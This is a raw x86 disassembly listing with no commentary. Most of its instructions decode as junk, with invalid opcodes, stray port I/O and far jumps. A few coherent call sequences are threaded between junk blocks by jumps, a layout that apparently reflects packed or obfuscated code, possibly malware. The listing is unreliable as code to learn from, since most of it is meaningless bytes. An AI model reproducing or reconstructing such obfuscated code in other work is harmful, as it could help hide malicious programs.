  402916:	pop    esp
  402917:	popf   
  402918:	mov    al,0x7d
  40291a:	out    dx,eax
  40291b:	out    0x2e,al
  40291d:	jecxz  0x40296f
  40291f:	cmp    esp,DWORD PTR cs:[edi]
  402922:	mov    dl,0xcd
  402924:	lds    ebx,FWORD PTR [edi-0x79]
  402927:	out    dx,al
  402928:	test   eax,0xabf898c9
  40292d:	es push es
  40292f:	adc    edx,DWORD PTR [ecx+0x5d]
  402932:	inc    esp
  402933:	mov    ah,0x82
  402935:	repz pop eax
  402937:	ins    BYTE PTR es:[edi],dx
  402938:	loop   0x4029ac
  40293a:	lds    esi,FWORD PTR [ecx+0x3d]
  40293d:	mov    al,ds:0x9d172727
  402942:	inc    ecx
  402943:	retf   
  402944:	lods   eax,DWORD PTR ds:[esi]
  402945:	loop   0x40299c
  402947:	outs   dx,BYTE PTR ds:[esi]
  402948:	sbb    DWORD PTR [ebp+0x38919f90],ebx
  40294e:	adc    al,0xf7
  402950:	push   ebx
  402951:	shr    BYTE PTR [ebp+0x69],cl
  402954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402955:	dec    ebp
  402956:	daa    
  402957:	mov    esi,0x84ee4ea7
  40295c:	out    dx,eax
  40295d:	mov    al,0xb4
  40295f:	popa   
  402960:	sar    DWORD PTR [ecx+esi*2-0x3c0ffaae],0xd3
  402968:	pop    ecx
  402969:	clc    
  40296a:	inc    esi
  40296b:	mov    dh,0xff
  40296d:	sub    esi,DWORD PTR [ebx+0x61]
  402970:	dec    ebx
  402971:	or     al,0x49
  402973:	sbb    BYTE PTR [eax+0x6d],ah
  402976:	gs lahf 
  402978:	mov    WORD PTR [ebp+0x15],ds
  40297b:	push   ebx
  40297c:	je     0x4029ce
  40297e:	mov    edx,es
  402980:	(bad)  
  402981:	cmc    
  402982:	jno    0x402940
  402984:	(bad)  
  402986:	jecxz  0x402937
  402988:	aaa    
  402989:	push   0x52260671
  40298e:	or     DWORD PTR [ebx+0x2f0fdfda],0xffffff88
  402995:	lahf   
  402996:	into   
  402997:	shl    ecx,cl
  402999:	out    0xed,al
  40299b:	arpl   WORD PTR [esi+0x42],bx
  40299e:	fsubr  QWORD PTR [edx-0x462d2feb]
  4029a4:	mov    ecx,0x19e74da7
  4029a9:	fist   DWORD PTR [edx+ebp*8-0x75]
  4029ad:	test   al,0x9
  4029af:	sbb    dh,dl
  4029b1:	sbb    BYTE PTR [ecx+0x76ff1af7],dl
  4029b7:	in     al,dx
  4029b8:	sub    esi,DWORD PTR [ebx]
  4029ba:	dec    edx
  4029bb:	loopne 0x402a2e
  4029bd:	cld    
  4029be:	cwde   
  4029bf:	aaa    
  4029c0:	arpl   WORD PTR [ebx+ebp*2+0x2b],cx
  4029c4:	xor    al,0xc8
  4029c6:	idiv   DWORD PTR [esi]
  4029c8:	push   ebx
  4029c9:	in     eax,0xb3
  4029cb:	or     al,BYTE PTR [ebx-0x5]
  4029ce:	jmp    0x402a2d
  4029d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029d1:	mov    esi,0x72a839dc
  4029d6:	bound  edx,QWORD PTR gs:[esi]
  4029d9:	fdivr  st(5),st
  4029db:	ret    
  4029dc:	adc    al,0x5a
  4029de:	pop    ecx
  4029df:	jae    0x402975
  4029e1:	push   edi
  4029e2:	push   edx
  4029e3:	adc    DWORD PTR [ebp+0x24],ecx
  4029e6:	dec    BYTE PTR [ebp+0x57]
  4029e9:	enter  0x7210,0x4d
  4029ed:	xor    DWORD PTR [ebx-0x6d],ebx
  4029f0:	inc    esi
  4029f1:	add    BYTE PTR [edi+ebx*1],0xe0
  4029f5:	stos   DWORD PTR es:[edi],eax
  4029f6:	mov    al,ds:0x82cd686
  4029fb:	pop    edx
  4029fc:	jbe    0x4029a1
  4029fe:	mov    ebp,0xe044560c
  402a03:	mov    ds:0x329fb90f,eax
  402a08:	adc    BYTE PTR [ecx+0x31],dh
  402a0b:	(bad)  [edx]
  402a0d:	int    0x90
  402a0f:	(bad)  
  402a10:	and    al,0x26
  402a12:	jno    0x40299f
  402a14:	inc    ebp
  402a15:	aam    0xf
  402a17:	test   DWORD PTR [ebx],eax
  402a19:	add    BYTE PTR [eax],al
  402a1b:	add    BYTE PTR [ebx-0x39cc0fbb],cl
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	xchg   BYTE PTR [ebp+ebp*4+0x1],bl
  402a38:	stos   BYTE PTR es:[edi],al
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	ins    DWORD PTR es:[edi],dx
  402a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a42:	repnz pop es
  402a44:	ret    
  402a45:	cmp    esp,esp
  402a47:	xchg   ebp,eax
  402a48:	pop    ds
  402a49:	adc    al,ch
  402a4b:	mov    ebp,eax
  402a4d:	adc    esi,DWORD PTR ds:[edx]
  402a50:	sbb    ebp,DWORD PTR [esi-0x54306745]
  402a56:	lfs    edi,FWORD PTR [esi+ebx*2]
  402a5a:	cmp    BYTE PTR [eax+0x27],dl
  402a5d:	xor    edi,DWORD PTR [eax+eiz*1+0x71]
  402a61:	aaa    
  402a62:	adc    eax,0xf9b2881
  402a67:	retf   
  402a68:	mov    ebx,0x6acb28e9
  402a6d:	inc    edx
  402a6e:	cld    
  402a6f:	sbb    al,BYTE PTR [edx+0x793f38a6]
  402a75:	dec    esp
  402a76:	mov    eax,0x6ba1a99
  402a7b:	sub    esp,DWORD PTR [eax-0x24]
  402a7e:	or     eax,0x9b7b851c
  402a83:	add    al,0x96
  402a85:	outs   dx,DWORD PTR ds:[esi]
  402a86:	mov    ecx,eax
  402a88:	test   DWORD PTR ds:0xe94902aa,ebp
  402a8e:	jp     0x402a35
  402a90:	in     eax,0x85
  402a92:	ror    DWORD PTR [edx+0x27ceb77f],0x7
  402a99:	sub    DWORD PTR [ebp+0x2],ecx
  402a9c:	or     esp,DWORD PTR [eax-0x45e687e7]
  402aa2:	bound  edx,QWORD PTR [ecx+ebp*8+0x31]
  402aa6:	cwde   
  402aa7:	scas   eax,DWORD PTR es:[edi]
  402aa8:	adc    dl,BYTE PTR [eax+0x7c3c1f3]
  402aae:	mov    ebx,0x978e7471
  402ab3:	jns    0x402adb
  402ab5:	xor    al,0x79
  402ab7:	push   ds
  402ab8:	cli    
  402ab9:	call   0x9ec8d91b
  402abe:	push   esp
  402abf:	test   BYTE PTR [ebx+0x38],ah
  402ac2:	add    esp,edx
  402ac4:	xor    eax,0x34ded8fe
  402ac9:	adc    ebx,DWORD PTR [ebx]
  402acb:	lahf   
  402acc:	mov    bl,BYTE PTR [esi]
  402ace:	push   ebx
  402acf:	inc    esi
  402ad0:	gs jno 0x402ac6
  402ad3:	sub    ah,BYTE PTR [ebp+0x38b615f5]
  402ad9:	fidiv  DWORD PTR [eax+eax*8]
  402adc:	mov    ds:0x261c86da,eax
  402ae1:	and    DWORD PTR [edx+0x1a],edi
  402ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ae5:	scas   al,BYTE PTR es:[edi]
  402ae6:	mov    esi,0x72861e6a
  402aeb:	out    dx,al
  402aec:	stos   BYTE PTR es:[edi],al
  402aed:	mov    ebp,DWORD PTR [ebx-0x2c]
  402af0:	sub    BYTE PTR [eax+ebp*2],cl
  402af3:	in     eax,0xd2
  402af5:	aam    0x80
  402af7:	lahf   
  402af8:	fsubr  st,st(1)
  402afa:	jmp    FWORD PTR [ecx-0x58e2dfb0]
  402b00:	lock retf 0x4df6
  402b04:	into   
  402b05:	lock jae 0x402aeb
  402b08:	data16 stos BYTE PTR es:[edi],al
  402b0a:	and    esi,DWORD PTR gs:[edx+eiz*4-0x2add8e82]
  402b12:	push   cs
  402b13:	push   ebp
  402b14:	or     bl,ah
  402b16:	div    DWORD PTR [eax+0x16]
  402b19:	mov    eax,ds:0x5fd671bd
  402b1e:	iret   
  402b1f:	pusha  
  402b20:	add    eax,0xc96a1793
  402b25:	fmulp  st(2),st
  402b27:	mov    bl,0x17
  402b29:	cmp    al,0x57
  402b2b:	sbb    DWORD PTR fs:[ebp+edi*1-0x26],0x36
  402b31:	ja     0x402b89
  402b33:	sub    ebp,DWORD PTR [ecx]
  402b35:	(bad)  
  402b36:	jns    0x402aee
  402b38:	sub    dl,BYTE PTR [ebx+eiz*8+0x5a]
  402b3c:	and    cl,dl
  402b3e:	loop   0x402ac6
  402b40:	out    dx,al
  402b41:	je     0x402b8d
  402b43:	xchg   ebx,eax
  402b44:	and    BYTE PTR [eax+0x44],0x6c
  402b48:	adc    dl,BYTE PTR [eax]
  402b4a:	add    eax,0x672bf6c5
  402b4f:	xchg   edx,eax
  402b50:	fist   WORD PTR [ebx-0x6c00dcf3]
  402b56:	push   ds
  402b57:	sbb    ecx,DWORD PTR [ebp+0xef0bf85]
  402b5d:	scas   eax,DWORD PTR es:[edi]
  402b5e:	into   
  402b5f:	xor    DWORD PTR [ebp+0xe1a20f4],esi
  402b65:	sub    DWORD PTR [edi+0x60],esp
  402b68:	inc    esi
  402b69:	push   esi
  402b6a:	out    dx,eax
  402b6b:	test   eax,0x501614c6
  402b70:	fidivr WORD PTR [edi]
  402b72:	div    DWORD PTR [ebp+0x1c]
  402b75:	cli    
  402b76:	mov    dl,0xa2
  402b78:	sub    dh,BYTE PTR [edi]
  402b7a:	adc    al,0x58
  402b7c:	inc    esi
  402b7d:	inc    esi
  402b7e:	popa   
  402b7f:	jmp    0x402bb7
  402b81:	mov    ebx,0x3e48c815
  402b86:	pop    edi
  402b87:	imul   ecx,DWORD PTR ds:0x39094e85,0xce2728a6
  402b91:	jmp    0x10e0:0x3115796d
  402b98:	out    0x39,al
  402b9a:	push   ebx
  402b9b:	fs mov cl,ch
  402b9e:	adc    eax,0x42c2213
  402ba3:	test   al,0x6f
  402ba5:	fist   WORD PTR ds:0xd1e2a497
  402bab:	inc    ebp
  402bac:	ss pusha 
  402bae:	cmp    esp,0xffffffa8
  402bb1:	add    DWORD PTR [esi],0xffffffd7
  402bb4:	inc    edx
  402bb5:	mov    dl,0xc1
  402bb7:	xlat   BYTE PTR ds:[ebx]
  402bb8:	inc    ebp
  402bb9:	pop    ss
  402bba:	lahf   
  402bbb:	cdq    
  402bbc:	inc    esi
  402bbd:	aam    0x86
  402bbf:	jno    0x402bba
  402bc1:	mov    ebp,0xc0852a26
  402bc6:	je     0x402bf4
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	idiv   BYTE PTR [edi+0xb36efce]
  402c17:	jle    0x402c97
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402bb3
  402c1e:	mov    ebp,0x5f391164
  402c23:	outs   dx,BYTE PTR ds:[esi]
  402c24:	mov    dl,0x36
  402c26:	daa    
  402c27:	cmp    eax,0x97994da4
  402c2c:	lds    ebp,FWORD PTR [esp+ebp*4+0x2127a45b]
  402c33:	les    eax,FWORD PTR [ecx-0x26b670fa]
  402c39:	hlt    
  402c3a:	inc    esi
  402c3b:	in     eax,0x2d
  402c3d:	(bad)  ds:0x6a755512
  402c43:	div    edx
  402c45:	ins    DWORD PTR es:[edi],dx
  402c46:	sub    eax,0x7b020e9
  402c4b:	xor    BYTE PTR ds:0xe74f1470,cl
  402c51:	push   eax
  402c52:	jo     0x402c58
  402c54:	xchg   edx,eax
  402c55:	mov    bh,0xaa
  402c57:	xchg   ebx,eax
  402c58:	and    DWORD PTR [eax],edi
  402c5a:	pop    es
  402c5b:	int    0xa1
  402c5d:	lock test BYTE PTR [edi],0x9a
  402c61:	push   ds
  402c62:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c64:	push   es
  402c65:	inc    esi
  402c66:	dec    ebp
  402c67:	mov    edi,0x2bcfa778
  402c6c:	aas    
  402c6d:	jg     0x402c2e
  402c6f:	popa   
  402c70:	sti    
  402c71:	mov    edx,0x3be7a1f5
  402c76:	add    al,0x54
  402c78:	(bad)  
  402c79:	and    edx,DWORD PTR [esi-0x507a73c6]
  402c7f:	sbb    esp,DWORD PTR [edi-0x3856fa6a]
  402c85:	fwait
  402c86:	(bad)  
  402c87:	popa   
  402c88:	sub    dl,BYTE PTR [edi]
  402c8a:	dec    edx
  402c8b:	in     eax,dx
  402c8c:	xor    BYTE PTR [ecx],0x7e
  402c8f:	(bad)  
  402c90:	and    BYTE PTR [ebx-0x69fc8322],dl
  402c96:	pop    ecx
  402c97:	xor    bl,BYTE PTR [ebx-0x47d4980b]
  402c9d:	in     eax,0x75
  402c9f:	mov    al,0x51
  402ca1:	pop    ebx
  402ca2:	repnz add edi,ecx
  402ca5:	pushf  
  402ca6:	mov    DWORD PTR [ebp+eax*2+0x15],eax
  402caa:	and    al,0x98
  402cac:	out    dx,eax
  402cad:	mov    ds:0xcae89c56,al
  402cb2:	fmul   QWORD PTR [ebx]
  402cb4:	xor    BYTE PTR [edi],0x5a
  402cb7:	add    eax,0x4fe13fd2
  402cbc:	(bad)  
  402cbd:	push   eax
  402cbe:	mov    al,ds:0xf7357af9
  402cc3:	aad    0x4c
  402cc5:	add    esi,eax
  402cc7:	xchg   ebx,eax
  402cc8:	nop
  402cc9:	sbb    DWORD PTR [edi+ebp*1],esi
  402ccc:	int    0x1f
  402cce:	test   DWORD PTR [ecx-0x20987966],0xf348c0b8
  402cd8:	mov    dl,0x18
  402cda:	stc    
  402cdb:	test   al,0x3e
  402cdd:	mov    BYTE PTR [ebp+eiz*2+0x6a7b6f9],0x7b
  402ce5:	not    ebx
  402ce7:	mov    WORD PTR [esi],ds
  402ce9:	sbb    ch,BYTE PTR ds:0x8e165081
  402cef:	push   es
  402cf0:	mov    ah,0x6e
  402cf2:	xchg   edx,eax
  402cf3:	jns    0x402c98
  402cf5:	adc    BYTE PTR [esi],dl
  402cf7:	aaa    
  402cf8:	adc    eax,0xf98384e
  402cfd:	dec    edx
  402cfe:	sbb    BYTE PTR [esi-0x753b496e],bl
  402d04:	imul   ebx,DWORD PTR [ebx-0x28],0xf4ad4e68
  402d0b:	shl    bl,1
  402d0d:	mov    bh,0xe1
  402d0f:	mov    al,0x7
  402d11:	lahf   
  402d12:	jmp    0x403f:0x54b9bef5
  402d19:	xchg   edi,eax
  402d1a:	jmp    DWORD PTR [edi+0x62]
  402d1d:	int3   
  402d1e:	inc    edx
  402d1f:	xchg   edi,eax
  402d20:	add    bh,al
  402d22:	shl    DWORD PTR ds:[esi-0x5d],0xd3
  402d27:	ds iret 
  402d29:	nop
  402d2a:	dec    DWORD PTR [eax]
  402d2c:	cs stos DWORD PTR es:[edi],eax
  402d2e:	dec    ecx
  402d2f:	sti    
  402d30:	xchg   ebp,eax
  402d31:	test   eax,0x35856221
  402d36:	mov    ds:0xd4b977df,eax
  402d3b:	mov    al,0xee
  402d3d:	fild   WORD PTR es:[eax]
  402d40:	pushf  
  402d41:	jle    0x402d03
  402d43:	cli    
  402d44:	inc    esp
  402d45:	jle    0x402d72
  402d47:	aad    0xa1
  402d49:	xchg   edx,eax
  402d4a:	xchg   BYTE PTR [edi+0x30d769bd],al
  402d50:	jmp    0xd0de9fd0
  402d55:	int3   
  402d56:	in     al,dx
  402d57:	fwait
  402d58:	in     al,dx
  402d59:	ror    dh,1
  402d5b:	lea    eax,es:[ecx+0x27]
  402d5f:	cmp    ah,bl
  402d61:	pusha  
  402d62:	sub    eax,0xace26f4e
  402d67:	jmp    0x402dc3
  402d69:	mov    ebx,0xfe323272
  402d6e:	into   
  402d6f:	dec    esp
  402d70:	adc    al,0xa
  402d72:	out    dx,al
  402d73:	ror    BYTE PTR [esi-0x38e3ea87],1
  402d79:	mov    edi,0x8f2c0779
  402d7e:	sti    
  402d7f:	push   ecx
  402d80:	sub    BYTE PTR [ecx+ebp*1-0x29],cl
  402d84:	and    DWORD PTR [edx+eax*4],ebp
  402d87:	sub    ah,cl
  402d89:	add    DWORD PTR [ecx+0x61f0b02c],ebp
  402d8f:	or     ah,BYTE PTR ds:[ebx+0x2d]
  402d93:	or     eax,0xca0de6b6
  402d98:	js     0x402de2
  402d9a:	jge    0x402df0
  402d9c:	push   es
  402d9d:	pop    ecx
  402d9e:	int3   
  402d9f:	pushf  
  402da0:	pop    esp
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ebx+eiz*1+0x42],1
  402de7:	xor    BYTE PTR [edi],dl
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402dbd
  402df2:	hlt    
  402df3:	ret    0x6a57
  402df6:	mov    esi,0xd28ea6fd
  402dfb:	ror    DWORD PTR [ebx],0x63
  402dfe:	fstp   QWORD PTR [edi+0x5210564f]
  402e04:	mov    ?,WORD PTR [ebx+0x23]
  402e07:	cmp    edx,ebp
  402e09:	sbb    eax,0x90603077
  402e0e:	ret    
  402e0f:	test   BYTE PTR [esi],dl
  402e11:	adc    al,0x22
  402e13:	rcl    bl,cl
  402e15:	jle    0x402e44
  402e17:	inc    edi
  402e18:	mov    bl,0x1b
  402e1a:	push   ds
  402e1b:	scas   eax,DWORD PTR es:[edi]
  402e1c:	and    ah,BYTE PTR [eax+0x67bfe742]
  402e22:	mov    bh,BYTE PTR [ecx]
  402e24:	cmp    DWORD PTR [edx],esi
  402e26:	jo     0x402e71
  402e28:	jecxz  0x402e7e
  402e2a:	loope  0x402e69
  402e2c:	fldcw  WORD PTR [esi+0x51]
  402e2f:	jbe    0x402e2d
  402e31:	cmc    
  402e32:	or     BYTE PTR [ecx-0x6fd668ce],ch
  402e38:	sub    al,0x99
  402e3a:	aaa    
  402e3b:	adc    BYTE PTR [edx],ch
  402e3d:	lock out 0x4d,al
  402e40:	mov    WORD PTR [ebp-0x2aeca825],?
  402e46:	popf   
  402e47:	jno    0x402e2e
  402e49:	jle    0x402e3a
  402e4b:	scas   al,BYTE PTR es:[edi]
  402e4c:	cmc    
  402e4d:	aam    0xf1
  402e4f:	mov    ebx,0x41d00242
  402e54:	sbb    al,0xed
  402e56:	mov    ecx,0x3d21fb86
  402e5b:	cli    
  402e5c:	fs pop esp
  402e5e:	in     eax,0x59
  402e60:	out    0xea,eax
  402e62:	sbb    DWORD PTR [edi],ebp
  402e64:	shl    DWORD PTR [eax],0xd
  402e67:	push   es
  402e68:	push   ss
  402e69:	ins    BYTE PTR es:[edi],dx
  402e6a:	neg    DWORD PTR [edx]
  402e6c:	icebp  
  402e6d:	call   0x39cc230b
  402e72:	jmp    0xd8c09722
  402e77:	int3   
  402e78:	mov    bl,BYTE PTR [edx-0x30]
  402e7b:	shl    bh,cl
  402e7d:	push   ecx
  402e7e:	sar    DWORD PTR [edi+eiz*2-0x21],0x86
  402e83:	sbb    eax,0x588ddd05
  402e88:	movhlps xmm4,xmm1
  402e8b:	(bad)  
  402e8c:	jp     0x402e3d
  402e8e:	pop    esp
  402e8f:	or     BYTE PTR [ebp-0x7],ah
  402e92:	(bad)  
  402e94:	test   DWORD PTR [eax+0x4e],ecx
  402e97:	pop    ax
  402e99:	inc    ebx
  402e9a:	xor    BYTE PTR [ecx],ah
  402e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e9d:	fimul  WORD PTR [ebx+0x69]
  402ea0:	jne    0x402e75
  402ea2:	daa    
  402ea3:	bound  ebx,QWORD PTR [edi-0x5f79ee35]
  402ea9:	inc    ebx
  402eaa:	adc    al,0x5
  402eac:	push   ss
  402ead:	mov    ch,0xd2
  402eaf:	fidiv  WORD PTR [edi+0x3b7bb160]
  402eb5:	stos   DWORD PTR es:[edi],eax
  402eb6:	jge    0x402eda
  402eb8:	pop    eax
  402eb9:	xor    ebp,edx
  402ebb:	jae    0x402e46
  402ebd:	mov    gs,WORD PTR [esp+ecx*8+0x20]
  402ec1:	fwait
  402ec2:	daa    
  402ec3:	dec    ebp
  402ec4:	xchg   esi,eax
  402ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ec6:	adc    DWORD PTR [ebp+0x5ca8ce98],0xffffffb1
  402ecd:	pop    ecx
  402ece:	fisubr WORD PTR [ebx+0x7cfa8729]
  402ed4:	outs   dx,DWORD PTR ds:[esi]
  402ed5:	adc    DWORD PTR [edx-0x49b3fa8c],ebp
  402edb:	jmp    0x97195873
  402ee0:	call   0x44d10f58
  402ee5:	dec    edx
  402ee6:	mov    bh,0x3a
  402ee8:	mov    ch,BYTE PTR [eax-0x8532054]
  402eee:	xor    eax,0x8cf144e7
  402ef3:	inc    ebp
  402ef4:	loope  0x402efc
  402ef6:	sti    
  402ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ef8:	mov    esp,DWORD PTR [edi-0x37]
  402efb:	mov    bl,0x6
  402efd:	push   edi
  402efe:	sub    edx,DWORD PTR gs:[ebx+0x3d]
  402f02:	rcl    cl,0xf6
  402f05:	push   ebx
  402f06:	push   eax
  402f07:	cs cdq 
  402f09:	sbb    eax,0xa8bb11b2
  402f0e:	scas   eax,DWORD PTR es:[edi]
  402f0f:	das    
  402f10:	adc    al,0xb0
  402f12:	ret    
  402f13:	(bad)  
  402f14:	out    dx,eax
  402f15:	add    al,0x1f
  402f17:	sub    bh,BYTE PTR [esp+esi*2+0x5c]
  402f1b:	popf   
  402f1c:	(bad)  
  402f1d:	mov    edx,0xf4645150
  402f22:	into   
  402f23:	cli    
  402f24:	mov    dh,0x2f
  402f27:	les    edx,FWORD PTR [ecx]
  402f29:	pusha  
  402f2a:	daa    
  402f2b:	dec    edi
  402f2c:	lea    edi,[edi]
  402f2e:	cld    
  402f2f:	bound  edx,QWORD PTR [edi+ebp*1]
  402f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f34:	leave  
  402f35:	repz int3 
  402f37:	aaa    
  402f38:	dec    esp
  402f39:	and    BYTE PTR [ebp+0x26],0xcf
  402f3d:	sbb    esp,DWORD PTR [edx+0x33]
  402f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f41:	call   0x5c4e:0x8bc1ca48
  402f48:	cwde   
  402f49:	repnz adc BYTE PTR [ebx+0x54],dh
  402f4d:	js     0x402f9c
  402f4f:	inc    edx
  402f50:	lds    ebp,FWORD PTR [ecx-0x2cc6413c]
  402f56:	pop    edi
  402f57:	adc    ebx,ecx
  402f59:	sbb    al,0xb0
  402f5b:	inc    eax
  402f5c:	ds jns 0x402f22
  402f5f:	push   es
  402f60:	jae    0x402fd1
  402f62:	xchg   ebp,eax
  402f63:	inc    ebx
  402f64:	dec    ebp
  402f65:	dec    ecx
  402f66:	xchg   DWORD PTR [edx+0x6a],ecx
  402f69:	pop    ebp
  402f6a:	in     al,0xf2
  402f6c:	loop   0x402f94
  402f6e:	dec    ebp
  402f6f:	dec    esp
  402f70:	fbld   TBYTE PTR [esi]
  402f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f73:	sti    
  402f74:	lea    eax,es:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x2f0ea5b7]
  402fae:	lahf   
  402faf:	pop    ss
  402fb0:	ds push ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402fcd
  402fb9:	out    dx,eax
  402fba:	data16 jne 0x402fe8
  402fbd:	or     BYTE PTR [edi+0xa],0x55
  402fc1:	test   BYTE PTR [eax+0x7d],al
  402fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fc5:	(bad)  
  402fc6:	mov    ebx,0x80080313
  402fcb:	mov    cl,0x50
  402fcd:	inc    esi
  402fce:	inc    ebx
  402fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fd0:	push   edi
  402fd1:	int    0x14
  402fd3:	js     0x402f9f
  402fd5:	mov    bh,0x7c
  402fd7:	out    0x59,al
  402fd9:	imul   esp,DWORD PTR [edx+0x20],0x67
  402fdd:	scas   al,BYTE PTR es:[edi]
  402fde:	iret   
  402fdf:	ror    edi,1
  402fe1:	ud1    esi,eax
  402fe4:	fidivr WORD PTR [ecx-0x11e3366a]
  402fea:	bound  edi,QWORD PTR [eax+0x73]
  402fed:	sbb    dh,dl
  402fef:	mov    edi,0x64478ead
  402ff4:	xchg   al,ah
  402ff6:	fild   WORD PTR [esi-0x26581433]
  402ffc:	and    dl,al
  402ffe:	mov    al,bh
  403000:	dec    ecx
  403001:	sbb    eax,DWORD PTR [esp+eiz*2]
  403004:	(bad)  
  403005:	push   eax
  403006:	mov    eax,ds:0xf2080422
  40300b:	cli    
  40300c:	add    esi,DWORD PTR ds:0xf3c045b9
  403012:	clc    
  403013:	inc    esi
  403014:	lahf   
  403015:	jo     0x40307b
  403017:	out    dx,eax
  403018:	in     eax,dx
  403019:	(bad)  
  40301a:	aad    0xa5
  40301c:	mov    edi,0x1f88c752
  403021:	xchg   esi,esi
  403023:	cld    
  403024:	std    
  403025:	push   edi
  403026:	push   0x38
  403028:	mov    ebp,0xc5b9370c
  40302d:	cld    
  40302e:	sub    eax,0x14fa2181
  403033:	xchg   ebx,eax
  403034:	ja     0x403077
  403036:	adc    DWORD PTR [ebx-0x358d0321],esp
  40303c:	xchg   edx,eax
  40303d:	int3   
  40303e:	inc    esp
  40303f:	mov    BYTE PTR [ebx-0x46d345ba],ch
  403045:	cmp    eax,0x1a1270c1
  40304a:	imul   edi,ebp,0xffffff9d
  40304d:	cmp    ebp,ebp
  40304f:	cmp    ebp,DWORD PTR ss:[edi-0x7e]
  403053:	int    0x1a
  403055:	stos   BYTE PTR es:[edi],al
  403056:	adc    DWORD PTR [eax-0x8785eb2],ebx
  40305c:	clc    
  40305d:	test   al,0x26
  40305f:	inc    edi
  403060:	sub    BYTE PTR [eax+0x5e],ch
  403063:	and    dh,BYTE PTR [ecx]
  403065:	out    0x63,al
  403067:	pop    ss
  403068:	repnz xchg edi,eax
  40306a:	inc    ebp
  40306b:	xchg   ebp,eax
  40306c:	xchg   ecx,eax
  40306d:	lahf   
  40306e:	mov    esi,0xa969e3a6
  403073:	dec    BYTE PTR cs:[edi+0x34]
  403077:	ja     0x4030cb
  403079:	in     eax,dx
  40307a:	sub    al,0xb5
  40307c:	add    dl,BYTE PTR [eax+0x63]
  40307f:	fs push edx
  403081:	pop    ebp
  403082:	inc    edi
  403083:	and    al,0xcc
  403085:	call   0xe8904f24
  40308a:	cli    
  40308b:	int3   
  40308c:	mov    ds:0xb0fa85c9,al
  403091:	es std 
  403093:	dec    edx
  403094:	bound  esi,QWORD PTR [ecx+0x33]
  403097:	dec    ebp
  403098:	fwait
  403099:	sub    DWORD PTR [eax],ebp
  40309b:	retf   0x6caa
  40309e:	or     BYTE PTR [edx-0x59],0xfb
  4030a2:	pushf  
  4030a3:	in     eax,0xc1
  4030a5:	arpl   WORD PTR [edx],dx
  4030a7:	(bad)  
  4030a8:	fs ins DWORD PTR es:[edi],dx
  4030aa:	mov    dh,0x8e
